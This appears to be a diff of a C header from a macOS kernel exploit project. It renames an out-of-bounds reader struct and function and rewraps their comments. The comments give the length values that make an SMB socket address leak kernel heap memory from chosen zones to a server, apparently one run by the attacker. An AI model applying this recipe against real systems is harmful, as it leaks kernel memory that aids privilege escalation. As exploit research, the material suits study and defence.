@@ -11,7 +11,7 @@
 #include <stdio.h>
 
 
-struct kmem_oob_reader_args {
+struct oob_reader_base_args {
     //  SMB server IPV4 socket address
     struct sockaddr_in smb_addr;
     
@@ -29,14 +29,14 @@ struct kmem_oob_reader_args {
     
     //  Server netbios name first segment length
     /// This value determines the amount of memory sent to server from `snb_name` field of
-    /// the `saddr` socket address. For example, if `saddr_ioc_len` is 32 , `saddr_snb_len` is 56
-    /// and`saddr_snb_name_seglen` is `(32 - offsetof(struct sockaddr_nb, snb_name)) + 24` will
-    /// lead to 24 bytes out of bound read data being sent to SMB server
+    /// the `saddr` socket address. For example, if `saddr_ioc_len` is 32 , `saddr_snb_len` is
+    /// 56 and`saddr_snb_name_seglen` is `(32 - offsetof(struct sockaddr_nb, snb_name)) + 24`
+    /// will lead to 24 bytes out of bound read data being sent to SMB server
     /// NOTE: Before the `snb_name` is sent to SMB server, the socket address is duplicated
-    /// using `smb_dup_sockaddr` method, which will duplicate the `saddr` to `default.kalloc.64` zone
-    /// So if you want an out of bound read from `default.kext.64` zone instead of a zone in `KHEAP_KEXT`,
-    /// the following values can be used: `saddr_ioc_len = 64`, `saddr_snb_len = 64` and
-    /// `saddr_snb_name_seglen = 64 +  (64 - offsetof(struct sockaddr_nb, snb_name))`
+    /// using `smb_dup_sockaddr` method, which will duplicate the `saddr` to `default.kalloc.64`
+    /// zone. So if you want an out of bound read from `default.kext.64` zone instead of other
+    /// zones in `KHEAP_KEXT`, the following values can be used: `saddr_ioc_len = 64`,
+    /// `saddr_snb_len = 64` and `saddr_snb_name_seglen = 64 +  (64 - offsetof(struct sockaddr_nb, snb_name))`
     uint8_t saddr_snb_name_seglen;
     
     //  Local nebios socket address length
@@ -50,6 +50,12 @@ struct kmem_oob_reader_args {
 };
 
 
-void kmem_oob_reader_read(const struct kmem_oob_reader_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size);
+/// Perform OOB read
+/// @param args see above for more details
+/// @param server_nb_name buffer for storing the server netbios name received by xe_smbx server
+/// @param server_nb_name_size size of `server_nb_name` buffer
+/// @param local_nb_name buffer for storing the local netbios name received by xe_smbx server
+/// @param local_nb_name_size size of `local_nb_name` buffer
+void oob_reader_base_read(const struct oob_reader_base_args* args, char* server_nb_name, uint32_t* server_nb_name_size, char* local_nb_name, uint32_t* local_nb_name_size);
 
 #endif /* zkext_neighbor_reader_xs_h */
